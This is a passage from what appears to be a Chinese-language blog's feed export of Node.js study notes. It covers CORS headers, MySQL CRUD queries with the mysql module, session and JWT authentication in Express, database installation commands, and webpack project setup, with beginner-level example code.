class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">res</span><span class="hljs-selector-class">.setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Headers&#x27;</span>,<span class="hljs-string">&#x27;xxx&#x27;</span>)<br></code></pre></td></tr></table></figure><p>设置不同的请求头</p><p>还有对请求方式进行设置的方法，<strong>默认情况下服务器只能响应<code>get post head</code>这三种请求</strong></p><p>我们需要通过<code>res.setHeader(&#39;Access-Control-Allow-Methods&#39;,&#39;xxx&#39;)</code></p><h3 id="4-简单请求，预检请求"><a href="#4-简单请求，预检请求" class="headerlink" title="4.简单请求，预检请求"></a>4.简单请求，预检请求</h3><p>简单请求满足，请求方式只有get post head</p><p>​                         请求头字段是常规的字段</p><p>预检请求：正式通信之前会发送option请求，这次option请求被称为预检请求</p><p>​                        请求方式为简单请求之外的请求都是预检请求</p><p>​                        含有自定义请求头字段的请求都是预检请求</p><h2 id="4-数据库"><a href="#4-数据库" class="headerlink" title="4. 数据库"></a>4. 数据库</h2><h3 id="4-1-链接mysql"><a href="#4-1-链接mysql" class="headerlink" title="4.1 链接mysql"></a>4.1 链接mysql</h3><p>和基本的node语法一样，导入mysql模块，使用createConnection方法或者createPool建立链接</p><p><strong>创建连接池 createPool方法</strong></p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">var</span> pool = mysql.createPool(optioins);<br></code></pre></td></tr></table></figure><p>options参数包含createConnection方法中可以使用的各种属性，除此之外还有以下属性：createConnection，waitForConnections，connectionLimit，queueLimit。</p><p>createConnection和createPool不同在于</p><p>createConnection的链接可以反复被使用，<strong>而且使用完毕后需要使用destroy方法或者end方法关闭链接</strong></p><p>而createPool的链接是一个链接池，可以通过getconnection方法获取链接，<strong>然后release链接，而连接池销毁还是使用end</strong></p><h3 id="4-2-查询"><a href="#4-2-查询" class="headerlink" title="4.2 查询"></a>4.2 查询</h3><p>使用<code>.query</code>方法执行查询语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>)<br><br><span class="hljs-comment">// 建立数据库链接</span><br><span class="hljs-keyword">const</span> db = mysql.createPool(&#123;<br>    <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;test&#x27;</span><br>&#125;)<br><br><span class="hljs-comment">// 查询</span><br>db.query(<span class="hljs-string">&#x27;SELECT * FROM STUDENT&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, rows</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(err);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(rows);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="4-3-插入"><a href="#4-3-插入" class="headerlink" title="4.3 插入"></a>4.3 插入</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 插入</span><br><span class="hljs-keyword">const</span> useradd = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;pigeon&#x27;</span>,<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;admin&#x27;</span><br>&#125;<br><span class="hljs-comment">// 问号是占位符</span><br><span class="hljs-keyword">const</span> sqlstr = <span class="hljs-string">&#x27;INSERT INTO student (name, password) VALUE (?, ?)&#x27;</span><br>db.query(sqlstr, [useradd.name, useradd.password], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, results</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        <span class="hljs-built_in">console</span>.log(err);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(results.affectedRows == <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;插入成功&#x27;</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>这里返回的result打印一下，是数据库执行语句之后的返回值，<strong>insert的返回值是一个对象</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">OkPacket</span> &#123;<br>  <span class="hljs-attr">fieldCount:</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">affectedRows:</span> <span class="hljs-number">1</span>,<br>  <span class="hljs-attr">insertId:</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">serverStatus:</span> <span class="hljs-number">2</span>,<br>  <span class="hljs-attr">warningCount:</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">message:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-attr">protocol41:</span> <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">changedRows:</span> <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>快捷插入，我们的mysql还支持我们快捷插入对象类型的数据，使用<code>SET ？</code>，然后query的第二个参数直接传对象</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">// 快速插入</span><br><span class="hljs-keyword">const</span> sqlstr = &#x27;INSERT INTO student <span class="hljs-keyword">SET</span> ?&#x27;<br><span class="hljs-keyword">db</span>.<span class="hljs-keyword">query</span>(sqlstr, useradd, function (<span class="hljs-keyword">err</span>, results) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">err</span>)&#123;<br>        console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(results.affectedRows == 1)&#123;<br>        console.<span class="hljs-built_in">log</span>(&#x27;插入成功&#x27;);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="4-4-更新"><a href="#4-4-更新" class="headerlink" title="4.4 更新"></a>4.4 更新</h3><p>更新语句使用update，依然是affectedRows为1的话，就代表更改成功</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">const <span class="hljs-keyword">user</span> = &#123;username: <span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-keyword">password</span>: <span class="hljs-string">&#x27;12138&#x27;</span>&#125;<br><br>const <span class="hljs-keyword">sql</span> = <span class="hljs-string">&#x27;UPDATE student SET PASSWORD=? where NAME=?&#x27;</span><br><br>// 查询<br>db.query(<span class="hljs-keyword">sql</span>, [<span class="hljs-keyword">user</span>.<span class="hljs-keyword">password</span>, <span class="hljs-keyword">user</span>.username], <span class="hljs-keyword">function</span> (err, results) &#123;<br>    <span class="hljs-keyword">if</span>(err)&#123;<br>        console.log(err);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(results.affectedRows == <span class="hljs-number">1</span>)&#123;<br>        console.log(<span class="hljs-string">&#x27;更改成功&#x27;</span>);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>还是可以使用<code>set ？</code>简化</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">const <span class="hljs-keyword">user</span> = &#123;<span class="hljs-keyword">password</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>const <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;jack&#x27;</span>;<br>const <span class="hljs-keyword">sql</span> = <span class="hljs-string">&#x27;UPDATE student SET ? where NAME=?&#x27;</span><br><br>// 查询<br>db.query(<span class="hljs-keyword">sql</span>, [<span class="hljs-keyword">user</span>, <span class="hljs-type">name</span>], <span class="hljs-keyword">function</span> (err, results) &#123;<br></code></pre></td></tr></table></figure><h3 id="4-5-删除"><a href="#4-5-删除" class="headerlink" title="4.5 删除"></a>4.5 删除</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">// 删除</span><br><span class="hljs-keyword">db</span>.<span class="hljs-keyword">query</span>(sql2, [name], *function* (*<span class="hljs-keyword">err</span>*, *results*) &#123;<br>  <span class="hljs-keyword">if</span>(*<span class="hljs-keyword">err</span>*)&#123;<br>     console.<span class="hljs-built_in">log</span>(*<span class="hljs-keyword">err</span>*);<br>  &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(*results*.affectedRows == 1)&#123;<br>     console.<span class="hljs-built_in">log</span>(&#x27;更改成功&#x27;);<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h2 id="5-身份认证"><a href="#5-身份认证" class="headerlink" title="5. 身份认证"></a>5. 身份认证</h2><h3 id="5-1-session"><a href="#5-1-session" class="headerlink" title="5.1 session"></a>5.1 session</h3><p>session认证机制：</p><p>http的无状态性：服务器端不知道是不是同一个人发送的请求，没有记忆性</p><p>cookie：虽然http无状态，但是服务器在第一次连接的时候给客户端一个cookie，之后每次请求，客户端都会携带这个cookie<strong>放到请求头中</strong>作为客户端的一个识别。</p><p><img src="https://img-blog.csdnimg.cn/31608417750740a983217e46591f735f.png" alt="cookie"></p><p>但是<strong>cookie不具有安全性</strong>，所以cookie中不能存放隐私和重要的数据</p><p>session的工作原理就是，接收到客户端携带的cookie之后，在内存中进行匹配，匹配成功后返回特定的内容给该用户</p><p>使用npm安装express-session，然后进行简单的配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> session = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><br><span class="hljs-comment">// 配置session中间件</span><br>app.<span class="hljs-keyword">use</span>(session(&#123;<br>    secret: <span class="hljs-string">&#x27;keyboard cat&#x27;</span>, <span class="hljs-comment">//secret值可以为任意字符串</span><br>    resave: <span class="hljs-literal">false</span>,          <span class="hljs-comment">//固定写法</span><br>    saveUninitialized: <span class="hljs-literal">true</span> <span class="hljs-comment">//固定写法</span><br>&#125;))<br></code></pre></td></tr></table></figure><p><strong>此时req中可以调用req.session来访问session中的内容</strong>，使用下面的语句可以实现session的存储</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">req.session.<span class="hljs-keyword">user</span> <span class="hljs-title">= req</span>.body<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">app<span class="hljs-selector-class">.post</span>(<span class="hljs-string">&#x27;/user&#x27;</span>, function (req, res) &#123;<br>    req<span class="hljs-selector-class">.session</span><span class="hljs-selector-class">.user</span> = req<span class="hljs-selector-class">.body</span><br>    req<span class="hljs-selector-class">.session</span><span class="hljs-selector-class">.isLogin</span> = true<br>    res<span class="hljs-selector-class">.send</span>(req.session)<br>&#125;)<br></code></pre></td></tr></table></figure><p>得到返回的req.session对象是，其中有cookie，还有我们存入的user和isLogin</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;cookie&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;originalMaxAge&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;expires&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-attr">&quot;httpOnly&quot;</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;user&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;jack&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;isLogin&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>获取session中的内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">app.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;/api/username&#x27;</span>, <span class="hljs-keyword">function</span> (req, res) &#123;<br>    console.log(req.<span class="hljs-keyword">session</span>);<br>    <span class="hljs-keyword">if</span>(!req.<span class="hljs-keyword">session</span>.isLogin)&#123;<br>        <span class="hljs-keyword">return</span> res.send(&#123;status: <span class="hljs-number">1</span>, msg: <span class="hljs-string">&#x27;failed&#x27;</span>&#125;)<br>    &#125;<br>    res.send(&#123;status: <span class="hljs-number">0</span>, msg: req.<span class="hljs-keyword">session</span>.<span class="hljs-keyword">user</span>.name&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="5-2-JWT-token"><a href="#5-2-JWT-token" class="headerlink" title="5.2 JWT-token"></a>5.2 JWT-token</h3><p>但是session不支持跨域，所以我们需要一个跨域的解决方案——JWT</p><p>jwt中是依靠token进行验证，token由服务端发送，存在浏览器的session或者localstorage中</p><p>安装jwt：jsonwebtoken用于生成jwt字符串，express-jwt用于解析jwt并还原成JSON对象</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span><span class="hljs-keyword">jsonwebtoken </span>express-<span class="hljs-keyword">jwt</span><br></code></pre></td></tr></table></figure><p>实际代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">const</span> expressjwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-jwt&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-comment">// 配置加密密钥</span><br><span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&#x27;!@#$1234&#x27;</span><br><br><span class="hljs-comment">// 解码encode</span><br>app.use(express.urlencoded(&#123;<span class="hljs-attr">extended</span>:<span class="hljs-literal">false</span>&#125;))<br><br><span class="hljs-comment">// 配置jwt转json配置编码和有效时间，unless选择哪些接口不需要转json</span><br>app.use(expressjwt.expressjwt(&#123;<span class="hljs-attr">secret</span>: secretKey, <span class="hljs-attr">algorithms</span>: [<span class="hljs-string">&quot;HS256&quot;</span>]&#125;).unless(&#123;<span class="hljs-attr">path</span>: [<span class="hljs-regexp">/^\/api\//</span>]&#125;))<br><br><span class="hljs-keyword">let</span> payload = &#123;<br>    <span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;req.body&#x27;</span><br>&#125;<br><br>app.post(<span class="hljs-string">&#x27;/api/user&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">const</span> token = jwt.sign(payload, secretKey, &#123;<span class="hljs-attr">expiresIn</span>: <span class="hljs-string">&#x27;1h&#x27;</span>&#125;)<br>    res.send(&#123;<br>        <span class="hljs-attr">status</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">msg</span>: token<br>    &#125;)<br>&#125;)<br><br>app.get(<span class="hljs-string">&#x27;/username&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    res.send(&#123;<span class="hljs-attr">status</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">msg</span>: payload&#125;)<br>&#125;)<br><br><br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>产生的token被<code>.</code>分成三部分：中间部分是我们的payload也就是数据，是经过加密的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ2</span>.ey<span class="hljs-number">11</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>InJlcS<span class="hljs-number">5</span>ib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>IiwiaWF<span class="hljs-number">0</span>IjoxNjY<span class="hljs-number">4</span>Njg<span class="hljs-number">0</span>NjIyLCJleHAiOjE<span class="hljs-number">2</span>Njg<span class="hljs-number">2</span>ODgyMjJ<span class="hljs-number">9</span>.zrlUT<span class="hljs-number">7</span>AT_Hknp<span class="hljs-number">7</span>BkkduiFQZkuV<span class="hljs-number">0</span>MFbfiqD<span class="hljs-number">80</span>wt<span class="hljs-number">3</span>hjYg<br></code></pre></td></tr></table></figure><p>这段代码选择了<strong>那些路径访问是不用token的</strong>，<strong>也就是颁发token的接口不需要token</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">app<span class="hljs-selector-class">.use</span>(expressjwt<span class="hljs-selector-class">.expressjwt</span>(&#123;secret: secretKey, algorithms: <span class="hljs-selector-attr">[<span class="hljs-string">&quot;HS256&quot;</span>]</span>&#125;)<span class="hljs-selector-class">.unless</span>(&#123;path: <span class="hljs-selector-attr">[/^\/api\//]</span>&#125;))<br></code></pre></td></tr></table></figure><p>剩下的接口都需要在header中添加Authorization字段，字段中写<code>Bearer&lt;space&gt;token</code> 然后才能成功发送请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Authorization</span>: <br><span class="hljs-attribute">Bearer</span> eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>InJlcS<span class="hljs-number">5</span>ib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>IiwiaWF<span class="hljs-number">0</span>IjoxNjY<span class="hljs-number">4</span>Njg<span class="hljs-number">0</span>ODM<span class="hljs-number">3</span>LCJleHAiOjE<span class="hljs-number">2</span>Njg<span class="hljs-number">2</span>ODg  <span class="hljs-number">0</span>Mzd<span class="hljs-number">9</span>.PMpquMte<span class="hljs-number">0</span>fP<span class="hljs-number">8</span>-_<span class="hljs-number">5</span>fhPw<span class="hljs-number">7</span>q<span class="hljs-number">9</span>AUT<span class="hljs-number">7</span>KOr<span class="hljs-number">4</span>zd<span class="hljs-number">3</span>LCZ<span class="hljs-number">8</span>jZUkms<br></code></pre></td></tr></table></figure><p>比如我们获取token之后添加Authorization字段，然后向<code>/username</code>发请求就能获取到用户名</p><p>这段代码分别设置了<strong>token的加密内容，密钥，有效时间</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">const</span> <span class="hljs-keyword">token</span> = jwt.<span class="hljs-built_in">sign</span>(payload, secretKey, &#123;expiresIn: &#x27;1h&#x27;&#125;)<br></code></pre></td></tr></table></figure><p>密钥使用secretKey字段定义</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 配置加密密钥</span><br><span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&#x27;!@#<span class="hljs-subst">$1234</span>&#x27;</span><br></code></pre></td></tr></table></figure><p>以上。</p>]]></content>
    
    
    <categories>
      
      <category>node.js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>some sql</title>
    <link href="/2022/11/01/some%20sql/"/>
    <url>/2022/11/01/some%20sql/</url>
    
    <content type="html"><![CDATA[<h1 id="一、NoSql"><a href="#一、NoSql" class="headerlink" title="一、NoSql"></a>一、NoSql</h1><p>nosql代表的是 （not only sql）是一种非关系型数据库，比较于关系型数据库，这种数据库的数据存储量更大，更利用应用和数据分析</p><p>比如Facebook等对于用户喜好等分析就是使用的这种数据库</p><p>非关系型数据不适合存储在数据表的行和列中，而是大块组合在一起。非关系型数据通常存储在数据集中，就像文档、键值对或者图结构。</p><p><strong>实例–&gt;数据库–&gt;集合(collection)–&gt;键值对(key-value)</strong></p><p>而这种数据库的代表就是MongoDB</p><h2 id="MongoDB："><a href="#MongoDB：" class="headerlink" title="MongoDB："></a>MongoDB：</h2><p>安装的话，按照正常的教程安装就好了，我这里选择了安装compass（一个可视化的数据库管理页面）</p><p>安装完成之后启动：</p><p>在MongoDB安装目录下的bin文件中打开cmd命令行，或者直接通过cmd命令输入安装目录下的bin文件，<br>进入安装目录后输入mongod –dbpath=../data –port=27017(后面的数字是你的端口号)。这里是必须要进入data文件中。</p><p>启动之后打开compass，点击connect就可以连接到数据库了</p><h1 id="二、Sql"><a href="#二、Sql" class="headerlink" title="二、Sql"></a>二、Sql</h1><p>常规的数据库也就是关系型数据库，关系型数据库更有标准化的结构</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql:"></a>mysql:</h2><p>最经典的sql数据库，安装之后默认在3306端口上</p><p>初始化数据库：</p><p>cmd 输入：<code>mysqld --initialize --console</code>，初始化数据库服务，生成data文件</p><p>输入<code>mysqld --install</code>将mysql加入系统服务中</p><p>在cmd（管理员）中打开 输入<code>net start mysql</code> 代表开启数据库服务</p><p>这个时候输入<code>mysql -u root -p</code></p><p>再输入密码，进入<code>mysql shell</code></p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>node.js</title>
    <link href="/2022/10/27/node.js/"/>
    <url>/2022/10/27/node.js/</url>
    
    <content type="html"><![CDATA[<h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><p>学习这门技术的很早之前我就知道了node，npm，js。js作为一门编程语言，难道只能用于前端吗？node这门技术到底是为了什么产生的呢？</p><p>定义：Node.js是一个基于Chrome V8引擎的JS运行环境</p><p>人话就是：node提供了js实现后端的api</p><p>就像浏览器提供了js前端实现的api（我们是dom和bom）</p><p>node提供了js能实现系统级代码的api</p><p>跳过亿点js基础…</p><h2 id="1-webpack构建node框架"><a href="#1-webpack构建node框架" class="headerlink" title="1.webpack构建node框架"></a>1.webpack构建node框架</h2><p>第一步创建一个目录</p><p>并进入到该目录下，进行初始化项目操作，<code>-y</code>代表使用默认配置</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> init -y<br></code></pre></td></tr></table></figure><p>回车，然后我们发现生成了package.json的配置文件，记录了项目的配置信息</p><p>安装webpack</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">npm install webpack webpack-cli --<span class="hljs-built_in">save</span>-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>webpack-cli实现命令行支持webpack</p><p><code>--save-dev</code>实现在package中设置依赖项</p><h3 id="1-1-目录结构"><a href="#1-1-目录结构" class="headerlink" title="1.1  目录结构"></a>1.1  目录结构</h3><p><code>node_modules</code>：存放了npm 安装的各种开发包</p><p><code>package-lock.json</code>：锁定安装依赖的小版本号</p><p><code>package.json</code>：大版本信息</p><h3 id="1-2-第一个node"><a href="#1-2-第一个node" class="headerlink" title="1.2 第一个node"></a>1.2 第一个node</h3><p>新建src文件夹</p><p>新建一个index.html和index.js</p><p><strong>将index.js放入src下！！！</strong></p><p>不然后面webpack打包会报错</p><p>在index.js中写入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">document.write(<span class="hljs-string">&quot;hello node!&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后在index.html 中引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行html之后我们得到打印出来的hello</p><p><strong>webpack优化</strong>:</p><p>虽然运行了node项目，但是我们没有用到webpack</p><p>新建dist目录，将index.html 放入，dist目录下的是显示给用户的页面，会更加简洁，更加优化</p><p>为了做到这样我们先安装Lodash，将write转换成标签（div）插入文本的方式</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save lodash</span><br></code></pre></td></tr></table></figure><p>然后我们就可以更改我们index.js中的代码</p><p><code>createElement</code>创建节点</p><p><code>join</code> 给节点inner添加数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;lodash&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addDiv</span>(<span 